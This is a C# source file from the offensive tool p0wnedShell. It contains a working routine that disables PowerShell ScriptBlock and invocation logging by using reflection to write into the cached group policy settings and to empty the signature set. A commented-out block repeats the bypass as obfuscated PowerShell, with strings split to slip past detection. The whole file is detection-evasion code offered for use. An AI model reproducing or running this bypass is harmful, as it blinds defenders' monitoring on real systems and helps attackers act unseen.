﻿namespace p0wnedShell
{
    using System;
    using System.Collections.Concurrent;
    using System.Collections.Generic;
    using System.Reflection;

    class p0wnedShellLoggingBypass
    {
        public static void runBypass(Assembly assembly)
        {
            //ScriptBlockLogging bypass credits: Ryan Cobb (@cobbr_io)
            try
            {
                if (assembly != null)
                {
                    Type type = assembly.GetType("System.Management.Automation.Utils");
                
                    if (type != null)
                    {
                        ConcurrentDictionary<string, Dictionary<string, Object>> settings = (ConcurrentDictionary<string, Dictionary<string, Object>>)type.GetField("cachedGroupPolicySettings", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);

                        Dictionary<string, Object> dic_e = new Dictionary<string, Object>();
                        dic_e.Add("EnableScriptBlockLogging", 0);
                        dic_e.Add("EnableScriptBlockInvocationLogging", 0);
                        settings.TryAdd("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", dic_e);

                        type = assembly.GetType("System.Management.Automation.ScriptBlock");
                        if (type != null)
                        {
                            type.GetField("signatures", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, new HashSet<string>());

                            Console.WriteLine("[+] ScriptBlockLogging bypass executed");
                        
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Error setting signature");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Error util ref ");
                }
            }
            catch(Exception e)
            {
                Console.WriteLine("[-] Error ScriptBlockLogging bypass");
            }


            /*String logbypass = "$settings = [Ref].Assembly.GetType(\"System.Management.Automation.Utils\").\"GetFie`ld\"(\"cachedGroupPolicySettings\",\"NonPu\"+\"blic,Static\").GetValue($null);"
            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'] = @{ };"
            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'].Add('EnableScr' + 'iptBlockLogging', \"0\");"
            +"$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Scr' + 'iptB' + 'lockLo' + 'gging'].Add('EnableScri' + 'ptBlockInvoca' + 'tionLogging', \"0\");"
            +"[Ref].Assembly.GetType(\"System.Management.Automation.ScriptBlock\").\"GetFie`ld\"(\"signatures\", \"NonPub\" + \"lic,static\").SetValue($null, (New - Object 'System.Collections.Generic.HashSet[string]'));";

            this.currentPowerShell.AddScript(logbypass);

            this.currentPowerShell.Invoke();*/
        }
    }
}
